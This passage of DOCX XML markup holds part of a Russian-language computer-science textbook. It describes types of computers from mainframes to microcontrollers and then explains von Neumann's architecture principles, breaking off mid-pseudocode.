        <w:t xml:space="preserve"> IBM Z (z15, z16) — классика жанра. Стоимость: от $100,000 до нескольких миллионов. В России их используют Сбербанк, ВТБ, аэрофлот.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Забавный факт:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> мейнфреймы до сих пор работают на языке COBOL, которому уже 65 лет. Во время пандемии COVID-19 в США была проблема: системы пособий по безработице писались на COBOL, а программистов, знающих COBOL, почти не осталось.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Серверы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сервер</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это компьютер, который обслуживает других. Ты открываешь сайт — запрос идёт на сервер. Запускаешь игру онлайн — подключаешься к игровому серверу. Смотришь видео на YouTube — видео лежит на серверах Google.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Классификация серверов:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Веб-серверы**: обрабатывают HTTP-запросы (Apache, nginx, IIS).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Серверы баз данных**: хранят и обрабатывают данные (MySQL, PostgreSQL, MongoDB).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Файловые серверы**: хранят файлы (NAS — Network Attached Storage).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Игровые серверы**: обрабатывают логику многопользовательских игр.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Облачные серверы**: виртуальные машины в дата-центрах (AWS, Azure, Google Cloud).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Форм-факторы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Rack-серверы**: вставляются в стойки (rack), обычно высотой 1U (4.4 см) или 2U.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Blade-серверы**: ещё более компактные, вставляются в специальные шасси.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Tower-серверы**: похожи на обычный системный блок ПК, но мощнее.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Сервер Dell PowerEdge R750 (типичный rack-сервер для корпораций):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2 процессора Intel Xeon (до 56 ядер суммарно)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>До 8 TB оперативной памяти</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>24 отсека для жёстких дисков</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Цена: $5,000-$20,000 в зависимости от конфигурации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дата-центры</w:t>
      </w:r>
      <w:r>
        <w:t>: серверы не живут поодиночке. Их собирают в дата-центры — огромные здания, забитые стойками с серверами. Например, дата-центр Google в Финляндии занимает площадь как 3 футбольных поля и потребляет электричества как маленький город.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Рабочие станции (Workstation)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Рабочая станция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это ПК на стероидах. Нужна для задач, где обычного компьютера не хватает: 3D-рендеринг, видеомонтаж 4K/8K, САПР (проектирование зданий, самолётов), научные вычисления.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Отличия от обычного ПК:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Процессоры серверного класса (Intel Xeon, AMD Threadripper) с большим количеством ядер (16-64 ядра).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Профессиональные видеокарты (NVIDIA Quadro, AMD Radeon Pro) вместо игровых GeForce.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Огромный объём ОЗУ (128-512 GB вместо стандартных 16-32 GB).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ECC-память (с коррекцией ошибок) для надёжности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Архитектурное бюро: проектирование в AutoCAD, Revit.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Анимационная студия: рендеринг в Blender, Maya (например, Pixar рендерит мультфильмы на кластерах рабочих станций).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Научная лаборатория: обработка данных, симуляции.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Видеопродакшн: монтаж видео в DaVinci Resolve, Adobe Premiere.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> HP Z8 Fury G5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Процессор: 2x Intel Xeon w9-3495X (56 ядер каждый, итого 112 ядер)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ОЗУ: до 2 TB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>GPU: до 4x NVIDIA RTX 6000 Ada</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Цена: $10,000-$50,000</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Персональные компьютеры (ПК)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Персональный компьютер</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это то, на чём ты читаешь этот учебник. Десктоп или ноутбук, Windows или macOS (или Linux, если ты параноик или программист).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Десктопы (настольные ПК):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Плюсы**: производительность, апгрейд (можно менять железо), охлаждение.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Минусы**: занимают место, нельзя носить с собой.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Применение**: игры, программирование, офисная работа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ноутбуки:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Плюсы**: мобильность, всё в одном корпусе.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Минусы**: ограниченная производительность (греются), сложно апгрейдить, дорого.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Категории**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ультрабуки (тонкие и лёгкие, MacBook Air, Dell XPS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Игровые ноутбуки (ASUS ROG, MSI, Razer)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Бизнес-ноутбуки (Lenovo ThinkPad, HP EliteBook)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типичная конфигурация (2025 год):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>CPU: Intel Core i5/i7 или AMD Ryzen 5/7 (6-8 ядер)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ОЗУ: 16-32 GB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хранилище: SSD 512 GB - 1 TB (NVMe)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>GPU: встроенная (Intel Iris, AMD Radeon) или дискретная (NVIDIA GeForce RTX 4060)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример задачи:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Студент покупает ноутбук за 80,000 рублей с процессором Intel i7-1355U (10 ядер, 12 потоков, частота 1.7-5.0 GHz), 16 GB ОЗУ, SSD 512 GB. Этого хватит для программирования, учёбы, игр на средних настройках, но не хватит для профессионального 3D-рендеринга.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Мобильные устройства</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Смартфоны и планшеты</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это полноценные компьютеры в кармане. По производительности современный флагманский смартфон сравним с ноутбуком 5-летней давности, но потребляет в разы меньше энергии.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Архитектура:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> почти все смартфоны работают на процессорах </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ARM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Apple A17 Pro, Qualcomm Snapdragon, MediaTek Dimensity). ARM — это RISC-архитектура, оптимизированная под низкое энергопотребление.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики флагманского смартфона (2025):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**CPU**: 8 ядер (например, Apple A18 Pro: 2 производительных ядра + 4 энергоэффективных)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ОЗУ**: 8-12 GB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Хранилище**: 256-512 GB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**GPU**: встроенный (Apple GPU, Adreno)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Энергопотребление**: батарея ~4000-5000 mAh, работает 1-2 дня</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример задачи:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> iPhone 15 Pro Max (процессор A17 Pro, 8 GB ОЗУ) выдаёт производительность ~2.5 терафлопса в GPU-тестах. Это примерно как PlayStation 4 (2013 года). То есть в кармане у тебя игровая консоль прошлого поколения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SoC (System-on-Chip):</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> мобильные процессоры — это не просто CPU, а целая система на одном чипе: процессор + графика + модем + нейропроцессор + контроллер памяти. Всё в одном кристалле размером с ноготь.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Встраиваемые системы (Embedded Systems)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Встраиваемая система</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это компьютер, встроенный в какое-то устройство для выполнения специализированной задачи. Ты их не видишь, но они повсюду: в холодильнике, стиральной машине, автомобиле, умных часах, роутере.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Специализация**: система делает одну задачу, но делает её хорошо.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ограничения**: маломощный процессор, мало памяти, низкое энергопотребление.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Надёжность**: должна работать годами без перезагрузок.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Микроконтроллеры** (MCU — Microcontroller Unit):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Arduino** (ATmega328P: 16 MHz, 2 KB ОЗУ, 32 KB флеш-памяти) — для DIY-проектов.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ESP32** (160 MHz, 520 KB ОЗУ, встроенный Wi-Fi и Bluetooth) — для IoT.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**STM32** (ARM Cortex-M, 72-480 MHz) — в промышленности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Автомобили**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Современный автомобиль — это компьютер на колёсах. В Tesla Model S около **50 микроконтроллеров** управляют всем: от двигателя до автопилота.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Бортовой компьютер Tesla работает на процессоре, сопоставимом с игровой консолью (кастомный чип на базе ARM с GPU).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Бытовая техника**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Стиральная машина: MCU управляет мотором, датчиками, нагревом воды.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Умная колонка (Amazon Echo, Яндекс.Станция): ARM-процессор + микрофоны + динамики.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Интернет вещей (IoT)**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Умные лампочки, термостаты, датчики — всё это встраиваемые системы с Wi-Fi или Bluetooth.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример задачи:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ESP32 (цена ~$5) имеет процессор 160 MHz, 520 KB ОЗУ. Это в 10,000 раз медленнее, чем твой ноутбук, но для управления умной лампочкой — более чем достаточно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.3.2. Принципы фон Неймана</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Теперь самое важное: почему все эти компьютеры — от суперкомпьютера Frontier до Arduino — работают по одним и тем же принципам?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В 1945 году математик </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Джон фон Нейман</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (John von Neumann) сформулировал архитектуру компьютера, которая стала фундаментом всей современной вычислительной техники. Это как законы Ньютона в физике: придумали 300 лет назад, но до сих пор работают.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пять принципов фон Неймана</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Двоичная система счисления</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Компьютер работает с двоичными числами (0 и 1). Это проще реализовать в электронике: есть ток — 1, нет тока — 0. Никаких десятичных цифр, никакой магии.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему не троичная система?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (вопрос с экзамена). Теоретически троичная система эффективнее по количеству состояний на элемент, но технически реализовать надёжное "три состояния" в электронике сложнее, чем "два состояния". Хотя в СССР в 1950-х годах построили экспериментальный троичный компьютер </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"Сетунь"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (МГУ), но идея не прижилась.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. Программное управление</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программа</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это последовательность команд, которая хранится в памяти компьютера так же, как и данные. Компьютер читает команды из памяти и выполняет их одну за другой.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>До фон Неймана:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> компьютеры программировались перестановкой проводов или переключением тумблеров (ENIAC). Чтобы изменить программу, нужно было физически переподключать кабели. Это занимало часы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>После фон Неймана:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> программа — это просто данные в памяти. Изменил данные — изменил программу. Революция.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3. Однородность памяти</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Данные и программа хранятся в одной и той же памяти</w:t>
      </w:r>
      <w:r>
        <w:t>. Для компьютера нет разницы между командой `ADD` и числом `42` — это просто биты. Это позволяет:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Программе изменять саму себя (самомодифицирующийся код).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Компилятору генерировать программы динамически.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вирусам перезаписывать программный код (привет, хакерам).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Гарвардская архитектура</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (альтернатива): память для программ и память для данных разделены физически. Используется в микроконтроллерах (например, AVR) для защиты кода от случайной перезаписи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4. Адресная память</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Память состоит из ячеек, каждая из которых имеет уникальный </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>адрес</w:t>
      </w:r>
      <w:r>
        <w:t>. Процессор может обратиться к любой ячейке напрямую по адресу (произвольный доступ — RAM, Random Access Memory).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> у тебя 16 GB ОЗУ. Это 16 × 2³⁰ байт = 17,179,869,184 байта. Каждый байт имеет адрес от 0 до 17,179,869,183. Процессор может прочитать байт по адресу 12345678 за одну операцию, не перебирая все предыдущие байты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>5. Последовательное выполнение команд</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Процессор выполняет команды </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>одну за другой</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> в порядке, заданном программой. Есть специальный регистр — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>счётчик команд</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Program Counter, PC), который указывает на адрес следующей команды.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Цикл выполнения команды (fetch-decode-execute):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Fetch** (выборка): прочитать команду из памяти по адресу PC.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Decode** (декодирование): понять, что это за команда.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Execute** (выполнение): выполнить команду.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Увеличить PC, перейти к следующей команде.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Условный переход</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (jump): команда, которая изменяет значение PC. Это основа всех `if`, `for`, `while` в программировании.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример кода (псевдокод):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>PC = 0x1000</w:t>
        <w:br/>
        <w:t>1000: LOAD R1, [0x2000]    ; Загрузить в регистр R1 значение из памяти по адресу 0x2000</w:t>
